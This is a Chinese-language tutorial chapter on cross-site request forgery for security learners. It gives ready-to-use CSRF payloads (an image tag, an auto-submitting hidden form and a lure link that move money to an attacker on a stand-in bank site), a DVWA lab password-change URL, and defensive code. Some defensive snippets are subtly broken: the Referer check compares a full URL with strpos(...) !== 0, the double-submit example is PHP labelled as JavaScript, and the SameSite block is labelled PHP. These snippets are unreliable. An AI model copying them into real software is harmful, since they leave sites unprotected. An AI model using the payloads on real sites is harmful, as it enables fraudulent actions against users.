# Chapter 5: CSRF 跨站请求伪造

## 5.1 CSRF 简介

CSRF (Cross-Site Request Forgery) 跨站请求伪造，是一种诱导受害者在已认证的 Web 应用上执行非预期操作的攻击。

## 5.2 CSRF 原理

1. 用户登录受信任网站 A
2. 网站 A 验证通过，返回 Session Cookie
3. 用户未登出网站 A，访问恶意网站 B
4. 网站 B 诱导用户向网站 A 发起请求
5. 浏览器携带 Cookie 向网站 A 发起请求
6. 网站 A 无法区分请求来源，执行了恶意操作

## 5.3 CSRF 攻击示例

### 5.3.1 GET 型 CSRF

```html
<img src="http://bank.com/transfer?to=attacker&amount=10000">
```

### 5.3.2 POST 型 CSRF

```html
<form action="http://bank.com/transfer" method="POST" id="csrf">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

### 5.3.3 诱导点击

```html
<a href="http://bank.com/transfer?to=attacker&amount=10000">点击领取红包</a>
```

## 5.4 CSRF 实战

### DVWA CSRF 练习

**Low 级别：**
```
修改密码 URL:
http://192.168.1.100/vulnerabilities/csrf/?password_new=admin&password_conf=admin&Change=Change
```

**Medium 级别：**
- 检查 HTTP Referer 头
- 需要从相同域名发起请求

**High 级别：**
- 需要验证 Token
- 结合 XSS 获取 Token

## 5.5 CSRF 防御

### 5.5.1 Token 验证

服务器生成随机 Token，验证请求中的 Token 是否有效。

```php
session_start();
$token = bin2hex(random_bytes(32));
$_SESSION['csrf_token'] = $token;

// 表单中嵌入
<input type="hidden" name="csrf_token" value="<?php echo $token; ?>">
```

### 5.5.2 验证 Referer

```php
$referer = $_SERVER['HTTP_REFERER'];
if (strpos($referer, 'example.com') !== 0) {
    die('Invalid referer');
}
```

### 5.5.3 SameSite Cookie

```php
# Set-Cookie: session=xxx; SameSite=Strict
# 或
# Set-Cookie: session=xxx; SameSite=Lax
```

### 5.5.4 双重提交 Cookie

```javascript
function validateCSRF() {
    $cookie = $_COOKIE['csrf_token'];
    $form = $_POST['csrf_token'];
    return $cookie === $form;
}
```

### 5.5.5 防御总结

| 防御措施 | 安全性 | 说明 |
|----------|--------|------|
| Token 验证 | 高 | 最有效的防御 |
| SameSite Cookie | 高 | 浏览器级防护 |
| Referer 验证 | 中 | 可被绕过 |
| 二次验证 | 高 | 重要操作确认 |
